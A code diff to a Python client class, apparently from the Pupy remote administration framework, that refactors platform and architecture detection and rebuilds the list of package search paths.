@@ -82,6 +82,7 @@ class PupyClient(object):
             return True
         return False
 
+    @property
     def platform(self):
         if self.is_android():
             return 'android'
@@ -94,6 +95,38 @@ class PupyClient(object):
         elif self.is_unix():
             return 'unix'
 
+    @property
+    def os_arch(self):
+        arch = self.desc['os_arch'].lower()
+        substitute = {
+            'x86_64': 'amd64',
+            'i386': 'x86',
+            'i686': 'x86',
+            'i486': 'x86',
+        }
+        return substitute.get(arch) or arch
+
+    @property
+    def arch(self):
+        os_arch_to_platform = {
+            'amd64': 'intel',
+            'x86': 'intel'
+        }
+
+        os_platform_to_arch = {
+            'intel': {
+                '32bit': 'x86',
+                '64bit': 'amd64'
+            }
+        }
+
+        if self.os_arch in os_arch_to_platform:
+            return os_platform_to_arch[
+                os_arch_to_platform[self.os_arch]
+            ][self.desc['proc_arch']]
+        else:
+            return None
+
     def is_proc_arch_64_bits(self):
         if "64" in self.desc["proc_arch"]:
             return True
@@ -101,34 +134,23 @@ class PupyClient(object):
 
     def get_packages_path(self):
         """ return the list of path to search packages for depending on client OS and architecture """
-        path=[]
-        if self.is_windows():
-            if self.is_proc_arch_64_bits():
-                path.append(os.path.join(ROOT, "packages","windows","amd64"))
-                path.append(os.path.join("packages","windows","amd64"))
-            else:
-                path.append(os.path.join(ROOT, "packages","windows","x86"))
-                path.append(os.path.join("packages","windows","x86"))
+        path = [
+            os.path.join('packages', self.platform),
+            os.path.join('packages', self.platform, 'all'),
+        ]
 
-            path.append(os.path.join(ROOT, "packages","windows","all"))
-            path.append(os.path.join("packages","windows","all"))
-        elif self.is_unix():
-            if self.is_proc_arch_64_bits():
-                path.append(os.path.join(ROOT, "packages","linux","amd64"))
-                path.append(os.path.join("packages","linux","amd64"))
-            else:
-                path.append(os.path.join(ROOT, "packages","linux","x86"))
-                path.append(os.path.join("packages","linux","x86"))
+        if self.arch:
+            path = path + [
+                os.path.join(p, self.arch) for p in path
+            ]
 
-            path.append(os.path.join(ROOT, "packages","linux","all"))
-            path.append(os.path.join("packages","linux","all"))
-        if self.is_android():
-            path.append(os.path.join(ROOT, "packages","android"))
-            path.append(os.path.join("packages","android"))
+        path.append(os.path.join('packages', 'all'))
 
-        path.append(os.path.join(ROOT, "packages","all"))
-        path.append(os.path.join("packages","all"))
-        return path
+        path = path + [
+            os.path.join(ROOT, p) for p in path
+        ]
+
+        return set(path)
 
     def load_pupyimporter(self):
         """ load pupyimporter in case it is not """
